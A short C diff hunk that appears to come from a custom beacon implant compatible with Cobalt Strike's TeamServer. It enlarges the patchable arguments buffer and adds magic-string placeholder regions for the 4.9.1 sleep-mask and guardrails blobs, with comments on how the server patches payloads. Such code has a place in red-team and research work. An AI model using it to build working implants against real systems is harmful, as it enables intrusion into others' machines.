@@ -27,11 +27,28 @@ setting setting_get(int id) {
 }
 
 /* PATCH_SIZE = sizeof(arguments) */
-#define PATCH_SIZE 4096
+/* 4.9.1: TeamServer writes a 6144-byte randomized-padded blob at the AAAABBBB
+ * magic (4.5 wrote 4096). 8192 keeps headroom for both TS generations. */
+#define PATCH_SIZE 8192
 
 /* patch this value with something that matches our arguments structure */
 const char mystrs[4096] = "TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ"; /* const puts this right where we want it! */
 char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR";
+
+/* 4.9.1 template regions. The 4.9.1 TeamServer patches these magic placeholders
+ * by file-wide string search (BeaconPayload.indexOf / replaceAt):
+ *
+ *   SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK -> 16384-byte sleep-mask blob (patchSleepMaskString
+ *     has NO missing-magic guard, so payload generation hard-fails without it).
+ *     The blob is the official BOF sleep mask; opaque to this beacon, whose own
+ *     sleep loop does not consume it.
+ *
+ *   GGGGuuuu...dddd -> 2048-byte BeaconGuardrails blob (optional; applyPatch skips
+ *     cleanly when the magic is absent. Kept so the TS-side patch path stays uniform).
+ *
+ * The 4.5 TeamServer ignores both regions, so one binary serves 4.5 and 4.9.1. */
+char sleepmask_region[16416] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK";
+char guard_region[2112] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";
 
 unsigned short setting_short(int field) {
 	setting value = setting_get(field);
